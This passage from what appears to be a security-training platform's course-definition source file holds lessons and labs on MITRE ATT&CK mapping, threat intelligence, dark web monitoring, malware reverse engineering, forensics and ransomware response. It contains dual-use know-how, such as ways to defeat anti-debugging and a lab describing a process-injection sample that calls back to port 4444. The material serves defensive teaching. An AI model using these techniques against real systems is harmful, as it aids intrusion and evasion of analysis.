TA0001 Initial Access → TA0002 Execution → TA0003 Persistence → TA0004 Privilege Escalation → TA0005 Defense Evasion → TA0006 Credential Access → TA0007 Discovery → TA0008 Lateral Movement → TA0009 Collection → TA0010 Exfiltration → TA0011 Command & Control → TA0040 Impact

**Techniques:** The "how" — specific method. Example: T1059 Command and Scripting Interpreter
**Sub-techniques:** Specific implementations. T1059.001 = PowerShell, T1059.003 = Windows Command Shell

### Using ATT&CK for Detection
The ATT&CK Navigator lets you visualize your detection coverage:
- Color techniques green: you have a detection rule
- Color techniques yellow: partial coverage
- Color techniques red: blind spot

Common blind spots:
- T1070 Indicator Removal (attackers clear logs)
- T1027 Obfuscated Files (base64, encoding)
- T1036 Masquerading (malware named svchost.exe)

### Using ATT&CK for Hunting
Hunt plans mapped to ATT&CK:
- Pick a technique (T1021.002 SMB/Windows Admin Shares)
- Find relevant data sources (Windows Security Event 5140, 5145)
- Query for abnormal usage (admin shares accessed from non-admin workstations)

### ATT&CK in Threat Intelligence
When a threat intel report says "APT28 uses T1566.001 (Spearphishing Attachment) and T1059.001 (PowerShell)", you immediately know:
- What their initial access method is
- What your email security needs to catch
- What your EDR should detect on execution`),
      LAB('soc-mitre-lab1', 'Map an Incident to ATT&CK', 100, 'An incident involved: phishing email with malicious Word document, macro executing PowerShell to download a payload, payload runs Mimikatz to dump credentials, attacker uses PsExec to move laterally, and encrypts files with ransomware. Map each step to the specific MITRE ATT&CK technique and sub-technique, identify the data source that would detect each technique, and write the detection rule (SPL or KQL) for the technique you consider most detectable with least false positives.', ['MITRE ATT&CK', 'phishing', 'PowerShell', 'Mimikatz', 'PsExec', 'lateral movement', 'ransomware', 'detection coverage']),
    ],
  },

  {
    id: 'soc-threat-intel',
    title: 'Threat Intelligence Operations',
    description: 'Collect, analyze, and operationalize threat intelligence to proactively defend your organization.',
    category: 'threat-intelligence',
    difficulty: 'intermediate',
    accentColor: '#e879f9',
    modules: [
      L('soc-ti-l1', 'Threat Intelligence Lifecycle', 75, `## Threat Intelligence Operations

Threat intelligence transforms raw data about attackers into actionable knowledge that improves your defenses. Done well, it shifts you from reactive to proactive.

### Intelligence Lifecycle
1. **Direction:** What do we need to know? What are our priority intelligence requirements (PIRs)?
2. **Collection:** Gather data from OSINT, dark web, ISACs, commercial feeds, internal telemetry
3. **Processing:** Normalize, deduplicate, filter noise
4. **Analysis:** What does this mean? Who is targeting us? How?
5. **Dissemination:** Share with the right audience in the right format
6. **Feedback:** Adjust collection based on what was useful

### Intelligence Types
**Strategic:** High-level for executives. "APT groups are targeting healthcare for ransomware."

**Operational:** For incident responders. "FIN7 is using a new phishing campaign with fake HR documents this month."

**Tactical:** For SOC analysts and security tools. IOCs: IP addresses, domains, file hashes, YARA rules.

### IOC Types & Shelf Life
| IOC Type | Shelf Life | Notes |
|----------|-----------|-------|
| IP Address | Days to weeks | Shared hosting; attacker pivots |
| Domain | Weeks to months | DGA domains change constantly |
| URL | Hours to days | Content changes |
| File Hash | Weeks | Trivially changed by recompile |
| YARA Rule | Months | Behavioral — harder to evade |
| ATT&CK TTP | Years | Most durable |

### Threat Intel Platforms
- **MISP:** Open-source, community-driven, excellent for sharing
- **OpenCTI:** Modern, STIX/TAXII native, graph-based
- **Recorded Future:** Commercial, real-time dark web monitoring
- **VirusTotal:** File/URL/IP reputation, community intelligence

### ISAC Sharing
Information Sharing & Analysis Centers: sector-specific threat sharing communities (FS-ISAC for financial, H-ISAC for healthcare). Critical for early warning of sector-targeted campaigns.`),
      LAB('soc-ti-lab1', 'Analyze a Threat Intel Report', 100, 'A threat intel report states: "APT29 (Cozy Bear) is actively targeting organizations using spearphishing with ISO files containing LNK files that execute encoded PowerShell to download Cobalt Strike Beacon. C2 uses HTTPS to legitimate-looking domains registered in the last 30 days." Extract: IOCs to block (what types, what shelf life), detections to build (Windows Event IDs, SIEM rules), hunting queries to run immediately, and what strategic intelligence this means for your organization\'s defense priorities.', ['APT29', 'IOC', 'spearphishing', 'ISO file', 'Cobalt Strike', 'C2 detection', 'YARA', 'threat intel operationalization']),
    ],
  },

  {
    id: 'soc-darkweb',
    title: 'Dark Web Monitoring',
    description: 'Monitor the dark web for credential leaks, data breach mentions, and threat actor communications.',
    category: 'threat-intelligence',
    difficulty: 'advanced',
    accentColor: '#e879f9',
    modules: [
      L('soc-dw-l1', 'Dark Web Threat Intelligence', 75, `## Dark Web Monitoring

The dark web is where threat actors sell data, discuss targets, and recruit. Monitoring it gives early warning of breaches, planned attacks, and compromised credentials.

### Dark Web Architecture
The dark web runs on Tor (The Onion Router). Traffic routes through multiple encrypted relays — making it very difficult to identify users or server locations.

**Types of Dark Web Content:**
- **Marketplaces:** Sell stolen credentials, credit cards, malware, exploit kits
- **Forums:** Threat actor discussion, exploit sharing, initial access broker postings
- **Paste sites (Tor-based):** Data dumps, leaked credentials
- **Ransomware extortion sites:** Victim data published by ransomware groups

### What to Monitor
- **Credential leaks:** Corporate email/password combos in breach dumps
- **Unauthorized data sales:** Company documents, customer PII being sold
- **Threat actor chatter:** Discussion of your company, sector, or key personnel
- **Initial Access Broker (IAB) postings:** Sellers offering access to your network
- **Ransomware blog mentions:** Groups claiming attacks before public disclosure

### Monitoring Tools
**Commercial:**
- Recorded Future Dark Web Intelligence
- Digital Shadows (Reliance Group)
- Intel 471 Malware Intelligence
- Flashpoint Business Risk Intelligence

**OSINT/Free:**
- Have I Been Pwned API (breach notifications)
- DeHashed (credential search)
- Ahmia.fi (Tor search engine)
- DarkOwl API

### Operational Security
Researchers accessing dark web should:
- Use dedicated research environment (VM, separate hardware)
- Route through Tor + VPN (VPN-over-Tor to protect exit node)
- Never access personal accounts from research system
- Legal review: accessing some dark web marketplaces may violate laws`),
      SIM('soc-dw-sim1', 'Dark Web Incident Simulation', 100, 'You receive an alert from your dark web monitoring service: a post on a Russian-language cybercrime forum is advertising "Full database dump of [YourCompany] — 500,000 customer records including SSN, DOB, account numbers" for $20,000 Bitcoin. No confirmed breach has occurred internally. Walk through your response: verification steps, who you notify, legal and regulatory obligations, how you communicate with affected customers, and what internal investigation you launch.'),
    ],
  },

  {
    id: 'soc-malware-analysis-advanced',
    title: 'Advanced Malware Analysis',
    description: 'Reverse engineer malware using Ghidra, IDA Pro, and x64dbg to extract capabilities and IOCs.',
    category: 'threat-intelligence',
    difficulty: 'advanced',
    accentColor: '#e879f9',
    modules: [
      L('soc-mal-adv-l1', 'Reverse Engineering & Dynamic Analysis', 75, `## Advanced Malware Analysis

Advanced malware analysis goes beyond running samples — it involves reverse engineering assembly code to understand exactly what malware does, even when it actively evades analysis.

### Analysis Toolchain
**Static Analysis:**
- **Ghidra:** NSA-released free disassembler/decompiler. Excellent for beginners.
- **IDA Pro:** Industry standard. Expensive but powerful.
- **Binary Ninja:** Modern alternative with API for scripting.
- **PE-bear:** PE structure analysis.
- **FLOSS (FireEye):** Extracts obfuscated strings.

**Dynamic Analysis:**
- **x64dbg / OllyDbg:** Interactive debugger for Windows binaries
- **Cutter:** Radare2 GUI for reversing
- **API Monitor:** Track Windows API calls at runtime
- **Noriben / CAPEv2:** Automated sandbox analysis

### Anti-Analysis Techniques
Malware often detects analysis environments:
- **Anti-VM:** Check for VMware registry keys, virtual disk names, MAC address prefixes (00:50:56), BeingDebugged flag
- **Anti-debugging:** IsDebuggerPresent(), NtQueryInformationProcess
- **Packing:** Compressed/encrypted payload; only decompresses in memory at runtime
- **Obfuscation:** String encryption, junk instructions, control flow flattening

### Defeating Anti-Analysis
- Patch IsDebuggerPresent check to return 0
- Use hardware breakpoints (invisible to software detection)
- Customize VM artifacts (change MAC prefix, remove VMware tools)
- Use kernel-mode debugger (WinDbg) for rootkits

### What to Extract
From every analysis session document:
- All network indicators (IPs, domains, URI patterns, user agents)
- File system artifacts (dropped files, paths, registry keys)
- Cryptographic keys if malware uses encryption
- YARA rules for detection
- ATT&CK technique mapping`),
      LAB('soc-mal-adv-lab1', 'Malware Capability Extraction', 100, 'Static analysis of a sample reveals: it imports VirtualAlloc, WriteProcessMemory, CreateRemoteThread, and WinINet functions. Strings show "cmd.exe /c" and a base64-encoded string. Running in sandbox shows a network connection to 185.220.x.x:4444 after 30 seconds. Describe: what capabilities each import indicates, what the base64 string likely contains, why the 30-second delay exists (anti-sandbox), how you extract the decoded payload, and write a Yara rule for this family.', ['process injection', 'WinINet', 'anti-sandbox', 'base64', 'YARA', 'Ghidra', 'CreateRemoteThread', 'network IOC']),
    ],
  },

  {
    id: 'soc-dfir',
    title: 'Digital Forensics Fundamentals',
    description: 'Collect, preserve, and analyze digital evidence following chain of custody procedures.',
    category: 'forensics-ir',
    difficulty: 'intermediate',
    accentColor: '#e879f9',
    modules: [
      L('soc-dfir-l1', 'Digital Forensics Methodology', 75, `## Digital Forensics Fundamentals

Digital forensics is the science of collecting and analyzing digital evidence to reconstruct events. Proper procedures ensure evidence is admissible and findings are defensible.

### Forensic Process
1. **Identification:** What devices/systems contain evidence? Computers, phones, servers, cloud accounts, network devices
2. **Preservation:** Prevent modification of evidence. Bit-for-bit image; never work on original
3. **Collection:** Acquire evidence following chain of custody
4. **Analysis:** Examine artifacts; reconstruct timeline
5. **Reporting:** Document findings in clear, court-ready language

### Chain of Custody
Every person who handles evidence must be documented:
- Who collected it
- When and where
- How it was transported and stored
- Who has accessed it since

**Without chain of custody, evidence may be inadmissible in court.**

### Memory Forensics
RAM contains: running processes, network connections, encryption keys, passwords, malware code. Must be captured while the system is running.

Tools: **Volatility** (command-line), **MemProcFS** (filesystem interface to memory)

Key Volatility commands:
\`\`\`bash
vol.py -f memory.dmp pslist          # Running processes
vol.py -f memory.dmp netscan         # Network connections
vol.py -f memory.dmp cmdline         # Command line args per process
vol.py -f memory.dmp malfind         # Memory-injected code
\`\`\`

### Disk Forensics Tools
- **FTK Imager:** Create forensic disk images (E01, AFF4, DD)
- **Autopsy:** GUI forensics platform, file carving, timeline
- **The Sleuth Kit:** Command-line disk forensics
- **Plaso / log2timeline:** Unified timeline generation

### Key Artifact Types
- **Registry:** Software installed, USB devices plugged in, user activity
- **Prefetch files:** Evidence of execution (even if files deleted)
- **Event Logs:** Security events, logons, service installations
- **LNK files:** Recently opened documents (even from deleted sources)
- **Browser artifacts:** History, downloads, cached credentials`),
      LAB('soc-dfir-lab1', 'Forensic Investigation Exercise', 100, 'You are responding to a suspected insider threat. An employee is accused of exfiltrating customer data before resigning. Describe your forensic investigation: how you legally acquire their laptop without contaminating evidence, what artifacts you examine to prove data exfiltration (USB connections, cloud upload history, email attachments sent), how you establish timeline using Windows event logs and filesystem timestamps, and what constitutes sufficient evidence to take legal action.', ['chain of custody', 'disk image', 'FTK Imager', 'USB artifacts', 'registry', 'prefetch', 'insider threat', 'timeline']),
    ],
  },

  {
    id: 'soc-ransomware-response',
    title: 'Ransomware Incident Response',
    description: 'Respond to active ransomware attacks — containment, recovery, and negotiation decisions.',
    category: 'soc-siem',
    difficulty: 'advanced',
    accentColor: '#e879f9',
    modules: [
      L('soc-ransom-l1', 'Ransomware Response Playbook', 75, `## Ransomware Incident Response

Ransomware is the most damaging cyber incident most organizations face. A well-rehearsed response plan can mean the difference between hours of downtime and weeks.

### Modern Ransomware Anatomy
Modern ransomware is double-extortion: encrypt files AND exfiltrate data. Groups like LockBit, ALPHV/BlackCat, and Cl0p threaten to publish stolen data if ransom isn't paid.

**Attack Timeline:**
1. Initial access (phishing, exposed RDP, vulnerability)
2. Reconnaissance (weeks to months — quiet)
3. Lateral movement (compromise additional systems)
4. Data exfiltration (steal data for leverage)
5. Ransomware deployment (encrypt everything simultaneously)

### Immediate Response (First Hour)
1. **Confirm** — Is this ransomware? Look for .locked extensions, ransom notes
2. **Alert** — Escalate to CISO, legal, executive team immediately
3. **Isolate** — Take affected systems offline from network. Do NOT shut down — RAM may contain keys
4. **Preserve** — Snapshot VMs before any changes; capture memory
5. **Identify scope** — Which systems are affected? Is the backup server compromised?
6. **Engage IR firm** — If you don't have the expertise, call CrowdStrike, Mandiant, or Palo Alto Unit 42

### Recovery Decision Matrix
| Backups available & clean? | Negotiation needed? |
|---------------------------|---------------------|
| Yes, tested, offline | No — restore from backup |
| Yes, but encrypted too | Maybe — assess recovery time vs cost |
| No / all compromised | High chance of paying or long rebuild |

### Ransom Payment Considerations
- Legal: Paying may violate OFAC sanctions if group is on sanctions list
- Practical: ~60% of organizations that pay still fail to recover all data
- Alternative: Check nomoreransom.org — free decryptors for many families

### Post-Incident
- Root cause analysis (how did they get in?)
- Mandatory: implement EDR, MFA, offline backups, privilege restrictions`),
      SIM('soc-ransom-sim1', 'Active Ransomware Response', 100, 'It is 3 AM. Your monitoring shows: 10,000 files encrypted across 40 servers in the last 20 minutes. Ransom note says "LockBit 3.0 — pay $2M in 72 hours or your 500GB of customer data gets published." You are the incident commander. Walk through your complete response: immediate isolation steps, who you call and in what order, how you assess backup integrity, the legal and compliance notifications required within 72 hours, and how you make the ransom payment decision.'),
    ],
  },
];
